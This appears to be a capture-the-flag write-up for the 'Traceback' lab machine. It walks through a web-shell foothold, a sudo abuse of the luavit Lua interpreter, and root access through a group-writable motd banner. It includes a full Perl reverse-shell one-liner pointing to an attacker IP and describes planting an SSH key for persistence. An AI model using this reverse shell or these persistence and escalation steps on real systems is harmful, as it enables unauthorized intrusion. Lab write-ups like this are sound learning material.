@@ -1,0 +1,42 @@
+* Traceback
+** Enumeration
+*** ssh
+*** http
+Site is already owned
+** Foothold
+Looking at https://github.com/xh4h/Web-Shells and trying all those shells find one that works and gives access to the box: ~smevk.php~
+
+Within a web interface, ~smevk~ allows upload/download, filesystem navigation and command execution. It's limited though.
+
+** Escalation
+*** webadmin -> sysadmin
+
+From smevk, it's easy to find the note that the sysadmin left the webadmin, pointing to ~luavit~, a program to execute ~lua~ programs. But where is it?
+
+~sudo -l~ points the way, it's in ~/home/sysadmin~, and webadmin can execute it *as* sysadmin with ~sudo~. And since it's just executing arbitrary programs, we can easily exploit...
+
+I choose to reference someone's package for executing shell commands in lua, https://github.com/zserge/luash, copying over the main script via the existing webshell, with a few tweaks so that the a reverse shell is opened against a listener on the attacker:
+
+#+begin_src lua
+local perl = 'perl -e \'use Socket;$i="10.10.16.90";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
+local list = command(perl)()
+print(list)
+#+end_src
+
+I ran this a few times with different commands (~ls~, ~whoami~, ~ping~) to make sure things were working and then ran the reverse shell with ~perl~ as above.
+
+Now with a reverse shell opened on my machine, I have ~sysadmin~ and ~user.txt~.
+
+*** sysadmin -> root
+
+After owning ~sysadmin~, I want an easy way back in. Luckily there's a ~/home/sysadmin/.ssh/authorized_keys~ file, so I generated a ssh key on the attacker box and append the public half to the sysadmin's authorized keys. Now I can drop the reverse shell and just ~ssh~ in directly.
+
+Next to elevate to root!
+
+Basic enumeration doesn't reveal anythig too obvious, but ~ps -ax~ happens to catch an odd copy command in action. ~pspy~ helps nail down what's happening exactly: the message-of-the-day files are being copied back and forth from ~/etc~ to ~/var/backups~ every 30 seconds.
+
+How does that help? Well the banner greeting is in one of those files, and it's executed everytime someone logs in... and in one of those directories the files are owned by ~root:sysadmin~, with group-write on. That means ~sysadmin~ can write to them but ~root~ will execute them.
+
+With just that circumstance alone there are probably a ton of ways to exploit, but simple is best. I add to the end of the login banner the same perl reverse shell, then open up a new ssh session before the file is overwritten.
+
+~root~ owned.
